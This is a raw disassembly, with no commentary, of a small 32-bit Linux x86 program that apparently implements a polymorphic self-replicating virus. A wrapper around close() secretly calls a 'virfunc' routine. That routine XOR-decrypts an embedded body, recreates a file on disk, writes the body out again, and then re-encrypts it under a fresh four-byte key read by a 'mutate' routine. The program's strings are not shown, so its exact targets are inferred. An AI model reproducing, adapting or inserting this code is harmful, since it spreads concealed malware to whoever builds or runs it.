push   ebp
mov    ebp,esp
push   ebx
call   8048489 <_init+0x9>
pop    ebx
add    ebx,0x237b
cmp    DWORD PTR [ebx+0x44],0x0
je     804849e <_init+0x1e>
call   0 <_init-0x8048480>
mov    esi,esi
call   8048614 <frame_dummy>
call   8048a3c <__do_global_ctors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   DWORD PTR ds:0x804a808
jmp    DWORD PTR ds:0x804a80c
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804a810
push   0x0
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a814
push   0x8
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a818
push   0x10
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a81c
push   0x18
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a820
push   0x20
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a824
push   0x28
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a828
push   0x30
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a82c
push   0x38
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a830
push   0x40
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a834
push   0x48
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a838
push   0x50
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a83c
push   0x58
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a840
push   0x60
jmp    80484b0 <.plt>
jmp    DWORD PTR ds:0x804a844
push   0x68
jmp    80484b0 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff8
push   eax
push   esp
push   edx
push   0x8048a6c
push   0x8048480
push   ecx
push   esi
push   0x8048a18
call   8048550 <__libc_start_main@plt>
hlt    
nop
nop
push   ebp
mov    ebp,esp
cmp    DWORD PTR ds:0x8049d68,0x0
jne    8048608 <__do_global_dtors_aux+0x44>
jmp    80485e1 <__do_global_dtors_aux+0x1d>
mov    esi,esi
lea    edx,[eax+0x4]
mov    DWORD PTR ds:0x8049d64,edx
mov    eax,DWORD PTR [eax]
call   eax
mov    eax,ds:0x8049d64
cmp    DWORD PTR [eax],0x0
jne    80485d4 <__do_global_dtors_aux+0x10>
mov    eax,0x8048540
test   eax,eax
je     80485fe <__do_global_dtors_aux+0x3a>
push   0x804a7f0
call   8048540 <__deregister_frame_info@plt>
mov    DWORD PTR ds:0x8049d68,0x1
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
mov    eax,0x80484e0
test   eax,eax
je     804862f <frame_dummy+0x1b>
push   0x804a8ec
push   0x804a7f0
call   80484e0 <__register_frame_info@plt>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
call   80486a4 <virfunc>
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   804865c <Close>
add    esp,0x4
mov    edx,eax
mov    eax,edx
jmp    8048658 <close+0x1c>
mov    esi,esi
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
push   ebx
mov    eax,0x6
mov    ebx,DWORD PTR [ebp+0x8]
int    0x80
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jl     8048680 <Close+0x24>
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,edx
jmp    804869c <Close+0x40>
lea    esi,[esi+0x0]
call   8048530 <__errno_location@plt>
mov    DWORD PTR [ebp-0x8],eax
mov    edx,DWORD PTR [ebp-0x8]
mov    eax,DWORD PTR [ebp-0x4]
neg    eax
mov    DWORD PTR [edx],eax
mov    eax,0xffffffff
jmp    804869c <Close+0x40>
lea    esi,[esi+0x0]
mov    ebx,DWORD PTR [ebp-0xc]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x14
push   esi
push   ebx
mov    DWORD PTR [ebp-0x8],0x0
mov    DWORD PTR [ebp-0xc],0x1
mov    DWORD PTR [ebp-0x10],0x0
cmp    DWORD PTR ds:0x804a7ec,0x0
je     80486d4 <virfunc+0x30>
xor    eax,eax
jmp    8048904 <virfunc+0x260>
lea    esi,[esi+0x0]
push   0x0
call   8048510 <umask@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x10],eax
push   0xa67
push   0x8049d80
call   804890c <Crypt>
add    esp,0x8
push   0x1ed
push   0x8048ac0
call   80484c0 <mkdir@plt>
add    esp,0x8
push   0x8048ad3
call   8048520 <unlink@plt>
add    esp,0x4
push   0x8048aee
push   0x1a4
push   0x42
push   0x8048ad3
call   8048580 <open@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   80484d0 <fdopen@plt>
add    esp,0x8
mov    DWORD PTR [ebp-0x14],eax
mov    esi,DWORD PTR [ebp-0x14]
mov    DWORD PTR [ebp-0x4],esi
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048756 <virfunc+0xb2>
push   0x8048af1
call   80484f0 <perror@plt>
add    esp,0x4
push   0xa67
push   0x8048b00
mov    eax,DWORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],eax
mov    esi,DWORD PTR [ebp-0x14]
push   esi
call   8048500 <fprintf@plt>
add    esp,0xc
push   0x804a7e8
call   8048998 <mutate>
add    esp,0x4
push   0xa67
push   0x8049d80
call   804890c <Crypt>
add    esp,0x8
mov    DWORD PTR [ebp-0x8],0x0
cmp    DWORD PTR [ebp-0x8],0xa66
jle    80487a8 <virfunc+0x104>
jmp    804883c <virfunc+0x198>
mov    esi,esi
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x14],eax
mov    ecx,0x88888889
mov    eax,DWORD PTR [ebp-0x14]
imul   ecx
mov    esi,DWORD PTR [ebp-0x14]
lea    ecx,[esi+edx*1]
mov    edx,ecx
sar    edx,0x3
mov    ecx,DWORD PTR [ebp-0x14]
sar    ecx,0x1f
sub    edx,ecx
mov    ebx,edx
mov    ecx,ebx
shl    ecx,0x4
sub    ecx,edx
mov    eax,DWORD PTR [ebp-0x14]
sub    eax,ecx
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0x0
jne    8048800 <virfunc+0x15c>
push   0x8048c0c
mov    esi,DWORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],esi
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048500 <fprintf@plt>
add    esp,0x8
mov    DWORD PTR [ebp-0xc],0x0
mov    DWORD PTR [ebp-0x14],0x8049d80
mov    edx,DWORD PTR [ebp-0x8]
mov    esi,DWORD PTR [ebp-0x14]
movzx  eax,BYTE PTR [edx+esi*1]
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
push   eax
push   0x8048c10
mov    esi,DWORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],esi
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048500 <fprintf@plt>
add    esp,0xc
inc    DWORD PTR [ebp-0xc]
inc    DWORD PTR [ebp-0x8]
jmp    8048798 <virfunc+0xf4>
mov    esi,esi
push   0x8048c17
mov    esi,DWORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],esi
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048500 <fprintf@plt>
add    esp,0x8
movzx  eax,BYTE PTR ds:0x804a7eb
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
push   eax
movzx  eax,BYTE PTR ds:0x804a7ea
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
push   eax
movzx  eax,BYTE PTR ds:0x804a7e9
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
push   eax
movzx  eax,BYTE PTR ds:0x804a7e8
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
push   eax
push   0x8048c20
mov    esi,DWORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],esi
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048500 <fprintf@plt>
add    esp,0x18
push   0xa67
push   0x8049d80
call   804890c <Crypt>
add    esp,0x8
push   0x8049d80
push   0x8048c5d
mov    esi,DWORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],esi
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048500 <fprintf@plt>
add    esp,0xc
mov    esi,DWORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],esi
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048570 <fclose@plt>
add    esp,0x4
mov    DWORD PTR ds:0x804a7ec,0x1
mov    esi,DWORD PTR [ebp-0x10]
mov    DWORD PTR [ebp-0x14],esi
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048510 <umask@plt>
add    esp,0x4
xor    eax,eax
jmp    8048904 <virfunc+0x260>
mov    esi,esi
lea    esp,[ebp-0x1c]
pop    ebx
pop    esi
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0xc
push   esi
push   ebx
mov    DWORD PTR [ebp-0x4],0x0
mov    DWORD PTR [ebp-0x8],0x0
mov    DWORD PTR [ebp-0x4],0x0
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x4]
cmp    eax,DWORD PTR [ebp+0xc]
jl     8048938 <Crypt+0x2c>
jmp    804898c <Crypt+0x80>
mov    esi,esi
mov    eax,DWORD PTR [ebp+0x8]
mov    edx,DWORD PTR [ebp-0x4]
add    eax,edx
mov    edx,DWORD PTR [ebp+0x8]
mov    ecx,DWORD PTR [ebp-0x4]
add    edx,ecx
mov    ecx,DWORD PTR [ebp-0x8]
mov    DWORD PTR [ebp-0xc],0x804a7e8
mov    bl,BYTE PTR [edx]
mov    esi,DWORD PTR [ebp-0xc]
xor    bl,BYTE PTR [ecx+esi*1]
mov    BYTE PTR [eax],bl
mov    eax,DWORD PTR [ebp-0x8]
inc    eax
mov    edx,eax
test   edx,edx
jge    8048969 <Crypt+0x5d>
add    edx,0x3
mov    ebx,edx
sar    ebx,0x2
mov    DWORD PTR [ebp-0x8],ebx
mov    edx,DWORD PTR [ebp-0x8]
mov    ecx,edx
lea    edx,[ecx*4+0x0]
mov    esi,eax
sub    esi,edx
mov    DWORD PTR [ebp-0x8],esi
inc    DWORD PTR [ebp-0x4]
jmp    804892c <Crypt+0x20>
lea    esi,[esi+0x0]
xor    eax,eax
jmp    8048990 <Crypt+0x84>
lea    esp,[ebp-0x14]
pop    ebx
pop    esi
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
nop
mov    DWORD PTR [ebp-0x8],0x0
mov    esi,esi
cmp    DWORD PTR [ebp-0x8],0x3
jle    80489b0 <mutate+0x18>
jmp    8048a10 <mutate+0x78>
push   0x0
push   0x8048c60
call   8048580 <open@plt>
add    esp,0x8
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jg     80489e8 <mutate+0x50>
push   0x8048c6c
call   80484f0 <perror@plt>
add    esp,0x4
call   8048530 <__errno_location@plt>
mov    eax,eax
mov    edx,eax
mov    ecx,DWORD PTR [edx]
mov    eax,ecx
jmp    8048a14 <mutate+0x7c>
mov    esi,esi
push   0x1
mov    eax,DWORD PTR [ebp+0x8]
mov    edx,DWORD PTR [ebp-0x8]
add    eax,edx
push   eax
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   8048590 <read@plt>
add    esp,0xc
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   804865c <Close>
add    esp,0x4
inc    DWORD PTR [ebp-0x8]
jmp    80489a8 <mutate+0x10>
xor    eax,eax
jmp    8048a14 <mutate+0x7c>
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
push   0x8048c80
call   8048560 <printf@plt>
add    esp,0x4
push   0xfffffff5
call   804863c <close>
add    esp,0x4
mov    edx,eax
mov    eax,edx
jmp    8048a38 <main+0x20>
leave  
ret    
nop
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x804a7f4
cmp    DWORD PTR ds:0x804a7f4,0xffffffff
je     8048a5c <__do_global_ctors_aux+0x20>
mov    esi,esi
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    8048a50 <__do_global_ctors_aux+0x14>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
call   8048a75 <_fini+0x9>
pop    ebx
add    ebx,0x1d8f
call   80485c4 <__do_global_dtors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
